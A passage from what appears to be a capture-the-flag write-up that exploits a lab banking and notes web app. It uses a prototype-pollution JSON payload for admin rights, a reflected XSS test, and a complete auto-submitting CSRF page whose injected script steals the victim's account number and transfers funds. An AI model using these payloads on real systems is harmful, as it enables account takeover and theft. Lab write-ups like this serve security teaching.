    {"id":1,"role":"user","username":"0xdf","password":"f3b9f58518f2b212467a8ab5174f1324d8cbdfcbb9028b163605105f85979146","createdAt":"2022-12-13T12:51:20.974Z","updatedAt":"2022-12-13T12:53:15.860Z"}
    

The ‚Äúrole‚Äù attribute is interesting. I can try setting that with a payload to
`/api/register` like:

    
    
    {
        "username":"0xdf2",
        "password":"0xdf",
        "role":"admin"
    }
    

But it doesn‚Äôt work. I can also try on `/api/user/1` adding a role, but again,
no change in the result.

#### Prototype Pollution

The last line of the challenge prompt is a good hint to look at prototype
pollution, a common attack against Node applications: ‚ÄúNo pollution from this
app ;)‚Äù.

[This post](https://learn.snyk.io/lessons/prototype-pollution/javascript/)
from Snyk does a pretty good job describing prototype pollution. The issue
comes up when objects are JavaScript are merged unsafely.

Each object in JavaScript has a `__proto__` attribute that holds things that
are like defaults for the object. For example, an object has `__proto__:
{"toString": <function>}`. This is what allows objects to call `.toString()`
and get a result.

If I can set the `__proto__` for the user object to have `{"role":"admin"}`,
then all users will get admin by default.

#### Fails with Password Change

My first attempts are on `/api/user/[id]`. I‚Äôll send a body with the
`__proto__`:

    
    
    {
        "password":"0xdf",
        "__proto__":{
            "role":"admin"
        }
    }
    

This crashes the server:

    
    
    HTTP/2 500 Internal Server Error
    Content-Type: application/json; charset=utf-8
    Date: Tue, 13 Dec 2022 13:20:31 GMT
    Etag: W/"3b-ypol7bSme21vOTNW75iv/m4eapI"
    X-Powered-By: Express
    Content-Length: 59
    
    {"error":"this._customSetters[key].call is not a function"}
    

Still, this is a good sign. It seems that I‚Äôve messed up something in the user
object.

#### Success with Registration

After many fails in the password change API, I‚Äôll turn to the registration
API. I‚Äôll add `__proto__` to the request for a new user, and it comes back as
admin:

![image-20221213082349259](https://0xdfimages.gitlab.io/img/image-20221213082349259.png)

In fact, now if I register another user without the pollution, that user still
comes back as admin:

![image-20221213082441128](https://0xdfimages.gitlab.io/img/image-20221213082441128.png)

On the ‚ÄúMy Notes‚Äù page, there‚Äôs now a note with the flag:

![image-20221213082516104](https://0xdfimages.gitlab.io/img/image-20221213082516104.png)

I‚Äôll register and login, and page has more options in the menu, and shows my
account:

![image-20221214124707434](https://0xdfimages.gitlab.io/img/image-20221214124707434.png)

There‚Äôs a `/transfer` page that takes a from, to, and amount:

![image-20221214123318431](https://0xdfimages.gitlab.io/img/image-20221214123318431.png)

`/promotion` just says come back when I have 100‚Ç¨:

![image-20221214124725917](https://0xdfimages.gitlab.io/img/image-20221214124725917.png)

`/support` takes a URL and send it to the staff:

![image-20221214123421246](https://0xdfimages.gitlab.io/img/image-20221214123421246.png)

This is a good hint that I can get them to click on a link. There‚Äôs also a
logout link.

#### Link Click Test

First I need to know if I can get someone on the site (presumably with 100‚Ç¨ or
more) to click on a link. I‚Äôll connect to the Hacking Lab VPN and send a link
to my VM, `http://10.13.0.22/test`. On submitting, it says:

![image-20221214123659201](https://0xdfimages.gitlab.io/img/image-20221214123659201.png)

Less than a minute later, there‚Äôs a hit on my Python webserver:

    
    
    152.96.7.3 - - [14/Dec/2022 17:36:59] code 404, message File not found
    152.96.7.3 - - [14/Dec/2022 17:36:59] "GET /test HTTP/1.1" 404 -
    152.96.7.3 - - [14/Dec/2022 17:36:59] code 404, message File not found
    152.96.7.3 - - [14/Dec/2022 17:36:59] "GET /favicon.ico HTTP/1.1" 404 -
    

#### Reflected XSS in Transfer

Trying to get the transfer to work is a bit tricky.

If I try to transfer from 0xdf to 0xdf, it redirects to the accounts page, and
says that‚Äôs not a valid account:

![image-20221214124745028](https://0xdfimages.gitlab.io/img/image-20221214124745028.png)

If I try my account number for both, the error message changes:

![image-20221214124832061](https://0xdfimages.gitlab.io/img/image-20221214124832061.png)

So it seems I need to know the account number of both the sender and receiver.
It also displays back the input username in that first message. I can check it
for reflected XSS by submitting `<script>alert(1)</script>` as one of the
users:

![image-20221214125025216](https://0xdfimages.gitlab.io/img/image-20221214125025216.png)

It works:

![image-20221214125038042](https://0xdfimages.gitlab.io/img/image-20221214125038042.png)

On clicking ok:

![image-20221214125049914](https://0xdfimages.gitlab.io/img/image-20221214125049914.png)

And in the source:

![image-20221214125116075](https://0xdfimages.gitlab.io/img/image-20221214125116075.png)

#### Exploit

I‚Äôll combine these two attacks into a payload that I can host and submit as a
link to the support staff. I‚Äôll show that process in [this
video](https://www.youtube.com/watch?v=XHOvZDLnJ2Y):

The final payload looks like:

    
    
    <html>
        <head>
            <title>Transfer some funds</title>
        </head>
        <body>
            <form method="post" action="https://76ee7cf6-b98a-400b-b66e-1e3a6d4c1665.idocker.vuln.land/transfer" id="evilform">
                <div class="form-outline mb-4">
                    <input name="from" id="from" class="form-control" value="B5DFABBCA8FC34ACF5E6"/>
                    <label class="form-label" for="from">from</label>
                </div>
    
                <div class="form-outline mb-4">
                    <input name="to" id="to" class="form-control" value="<script>setTimeout(()=> {var account = document.getElementsByTagName('tr')[1].getElementsByTagName('td')[0].textContent; fetch('https://76ee7cf6-b98a-400b-b66e-1e3a6d4c1665.idocker.vuln.land/transfer', {method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'from=' + account + '&to=B5DFABBCA8FC34ACF5E6&amount=100', mode: 'cors'}, 100);})</script>" />
                    <label class="form-label" for="to">to</label>
                </div>
    
                <div class="form-outline mb-4">
                    <input type="number" name="amount" id="amount" class="form-control" value="100" step="0.1"/>
                    <label class="form-label" for="amount">amount</label>
                </div>
    
                <button type="submit" class="btn btn-primary btn-block mb-4">Transfer</button>
            </form>
            <script>
                evilform.submit();
            </script>
        </body>
    </html>
    

On sending, there‚Äôs a hit at the webserver:

    
    
    152.96.7.3 - - [14/Dec/2022 18:32:18] "GET /xss.html HTTP/1.1" 200 -
    

And then I have 100 ‚Ç¨ in my account:

![image-20221214134204386](https://0xdfimages.gitlab.io/img/image-20221214134204386.png)

On the promotions page there‚Äôs a flag:

![image-20221214134226022](https://0xdfimages.gitlab.io/img/image-20221214134226022.png)
